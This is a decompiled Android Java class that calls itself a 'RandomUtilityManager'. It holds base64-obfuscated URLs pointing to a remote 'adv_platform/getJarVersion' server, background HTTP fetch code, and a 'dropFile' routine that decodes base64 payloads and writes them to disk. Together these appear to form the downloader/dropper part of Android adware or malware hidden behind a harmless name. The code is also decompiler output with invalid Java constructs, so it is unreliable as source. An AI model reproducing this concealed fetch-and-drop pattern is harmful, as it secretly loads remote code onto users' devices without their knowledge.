package com.ljtq.res.ut;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo$State;
import android.net.NetworkInfo;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

public final class RandomUtilityManager {
    private static final int I = 0x400;

    public RandomUtilityManager() {
        super();
    }

    public static void executeRequest(String URL, ResponseHandlerInterface rhi) {
        new Thread(new Runnable(URL, rhi) {
            public final void run() {
                URLConnection urlConnection;
                try {
                    StringBuilder sb = new StringBuilder();
                    urlConnection = new URL(this.J).openConnection();
                    ((HttpURLConnection)urlConnection).setRequestMethod("GET");
                    ((HttpURLConnection)urlConnection).setConnectTimeout(50000);
                    ((HttpURLConnection)urlConnection).setReadTimeout(50000);
                    ((HttpURLConnection)urlConnection).setRequestProperty("Content-Type", "application/json");
                    if(((HttpURLConnection)urlConnection).getResponseCode() == 200) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(((HttpURLConnection)urlConnection).getInputStream(), "utf-8"));
                        while(true) {
                            String line = br.readLine();
                            if(line != null) {
                                sb.append(line);
                                continue;
                            }

                            break;
                        }
                    }
                    else {
                        new StringBuilder("fail , code = ").append(((HttpURLConnection)urlConnection).getResponseCode());
                        if(this.rhi != null) {
                            this.rhi.handleResponse(sb.toString());
                        }
                    }

                    if(this.rhi != null) {
                        this.rhi.handleResponse(sb.toString());
                    }
                }
                catch(Throwable th) {
                label_59:
                    if(urlConnection != null) {
                        ((HttpURLConnection)urlConnection).disconnect();
                    }

                    throw th;
                }
                catch(Exception ex) {
                    try {
                        if(this.rhi != null) {
                            this.rhi.handleException(ex);
                        }
                    }
                    catch(Throwable th) {
                        goto label_59;
                    }

                    if(urlConnection == null) {
                        return;
                    }

                    ((HttpURLConnection)urlConnection).disconnect();
                    return;
                }

                if(urlConnection != null) {
                    ((HttpURLConnection)urlConnection).disconnect();
                }
            }
        }).start();
    }

    private static String getURL(int integer) {
        String url = integer % 2 == 0 ? RandomUtilityManager.base64DecodeString("aHR0cDovL24xNTEuaGF0Y2hiZWVuLmNvbTo4MDgwL2Fkdl9wbGF0Zm9ybS9nZXRKYXJWZXJzaW9uL2NwaWQvdmVyc2lvbl9jb2RlL2NvdW50cnk=") : RandomUtilityManager.base64DecodeString("aHR0cDovL24xNTIuaGF0Y2hiZWVuLmNvbTo4MDgwL2Fkdl9wbGF0Zm9ybS9nZXRKYXJWZXJzaW9uL2NwaWQvdmVyc2lvbl9jb2RlL2NvdW50cnk=");
        return url;
    }

    private static void saveByteArrayToFile(byte[] byteArray, String filename) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(byteArray);
        File file = new File(filename);
        if(!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
        }

        file.createNewFile();
        FileOutputStream fos = new FileOutputStream(file);
        byte[] buff = new byte[0x400];
        while(true) {
            int readBytes = ((InputStream)bais).read(buff);
            if(readBytes == -1) {
                break;
            }

            ((OutputStream)fos).write(buff, 0, readBytes);
            ((OutputStream)fos).flush();
        }

        ((OutputStream)fos).close();
        ((InputStream)bais).close();
    }

    private static void dropFile(String filename, String str) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(RandomUtilityManager.base64DecodeStringToByteArray(str));
        File file = new File(filename);
        if(!file.getParentFile().exists()) {
            file.getParentFile().mkdirs();
        }

        file.createNewFile();
        FileOutputStream fos = new FileOutputStream(file);
        byte[] buffer = new byte[0x400];
        while(true) {
            int readBytes = ((InputStream)bais).read(buffer);
            if(readBytes == -1) {
                break;
            }

            ((OutputStream)fos).write(buffer, 0, readBytes);
            ((OutputStream)fos).flush();
        }

        ((OutputStream)fos).close();
        ((InputStream)bais).close();
    }

    private static boolean isConnectedToNetwork(Context ctx) {
        boolean res = false;
        Object connectivityManager = ctx.getSystemService("connectivity");
        if(connectivityManager != null) {
            NetworkInfo[] networksInfo = ((ConnectivityManager)connectivityManager).getAllNetworkInfo();
            if(networksInfo != null && networksInfo.length > 0) {
                int i = 0;
                while(i < networksInfo.length) {
                    if(networksInfo[i].getState() == NetworkInfo$State.CONNECTED) {
                        res = true;
                    }
                    else {
                        ++i;
                        continue;
                    }

                    return res;
                }
            }
        }

        return res;
    }

    public static byte[] base64DecodeStringToByteArray(String string) throws Exception {
        return Base64.decode(string.getBytes(), 1);
    }

    private static String base64DecodeByteArrayToString(byte[] bytes) throws Exception {
        return new String(Base64.encode(bytes, 1));
    }

    private static String decodeStringFromFileToString(String filename) throws Exception {
        byte[] byteArray = new byte[0];
        File file = new File(filename);
        if(file.exists()) {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream baos = new ByteArrayOutputStream(0x800);
            byte[] buff = new byte[0x400];
            while(true) {
                int readBytes = fis.read(buff);
                if(readBytes == -1) {
                    break;
                }

                baos.write(buff, 0, readBytes);
                baos.flush();
            }

            baos.close();
            fis.close();
            byteArray = baos.toByteArray();
        }

        return new String(Base64.encode(byteArray, 1));
    }

    private static byte[] fetchBytesFromFile(String filename) throws Exception {
        byte[] byteArray = new byte[0];
        File file = new File(filename);
        if(file.exists()) {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream baos = new ByteArrayOutputStream(0x800);
            byte[] buff = new byte[0x400];
            while(true) {
                int readBytes = fis.read(buff);
                if(readBytes == -1) {
                    break;
                }

                baos.write(buff, 0, readBytes);
                baos.flush();
            }

            baos.close();
            fis.close();
            byteArray = baos.toByteArray();
        }

        return byteArray;
    }

    private static String base64EncodeString(String str) {
        String res;
        try {
            res = Base64.encodeToString(str.getBytes("utf-8"), 0);
        }
        catch(UnsupportedEncodingException ex) {
            ex.printStackTrace();
        }

        return res;
    }

    public static String base64DecodeString(String str) {
        String res;
        try {
            res = new String(Base64.decode(str, 0), "utf-8");
        }
        catch(Exception ex) {
            ex.printStackTrace();
        }

        return res;
    }
}

